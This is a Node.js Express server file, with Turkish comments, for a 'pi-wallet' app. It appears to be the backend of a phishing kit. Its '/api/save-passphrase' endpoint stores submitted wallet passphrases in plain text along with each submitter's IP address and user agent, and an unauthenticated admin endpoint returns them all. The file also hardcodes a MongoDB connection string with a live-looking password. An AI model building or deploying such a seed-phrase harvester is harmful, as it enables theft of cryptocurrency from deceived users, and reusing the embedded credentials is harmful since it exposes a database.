const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const Passphrase = require('./models/Passphrase');

dotenv.config();

const app = express();

// MongoDB bağlantı ayarları
const connectDB = async () => {
  try {
    await mongoose.connect("mongodb+srv://develophasan:Vkm79dHv9pQfUzgq@cluster0.dbj9u.mongodb.net/pi-wallet?retryWrites=true&w=majority&appName=Cluster0", {
      dbName: 'pi-wallet',
      connectTimeoutMS: 60000,
      socketTimeoutMS: 60000,
      serverSelectionTimeoutMS: 60000,
      maxPoolSize: 10,
      minPoolSize: 5,
      retryWrites: true,
      retryReads: true,
      w: 'majority'
    });
    console.log('MongoDB bağlantısı başarılı!');
  } catch (err) {
    console.error('MongoDB bağlantı hatası:', err);
    // 5 saniye sonra tekrar bağlanmayı dene
    setTimeout(connectDB, 5000);
  }
};

// İlk bağlantıyı başlat
connectDB();

// Bağlantı koptuğunda yeniden bağlan
mongoose.connection.on('disconnected', () => {
  console.log('MongoDB bağlantısı kesildi. Yeniden bağlanılıyor...');
  setTimeout(connectDB, 5000);
});

// CORS ayarları
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// Middleware to check MongoDB connection
const checkDBConnection = (req, res, next) => {
  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      error: 'Veritabanı bağlantısı kurulamadı. Lütfen biraz sonra tekrar deneyin.'
    });
  }
  next();
};

// Passphrase kaydetme endpoint'i
app.post('/api/save-passphrase', checkDBConnection, async (req, res) => {
  try {
    console.log('İstek alındı:', req.body);
    
    const { passphrase } = req.body;
    if (!passphrase) {
      return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
    }

    const newPassphrase = new Passphrase({
      passphrase,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    });

    const savedPassphrase = await newPassphrase.save();
    console.log('Passphrase kaydedildi:', savedPassphrase._id);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Kaydetme hatası:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Admin endpoint'i
app.get('/api/admin/passphrases', checkDBConnection, async (req, res) => {
  try {
    const passphrases = await Passphrase.find().sort({ createdAt: -1 });
    res.json({ success: true, data: passphrases });
  } catch (error) {
    console.error('Veri alma hatası:', error);
    res.status(500).json({ success: false, error: 'Veriler alınamadı' });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});

// Genel hata yakalama
process.on('unhandledRejection', (error) => {
  console.error('Yakalanmamış Promise Reddi:', error);
}); 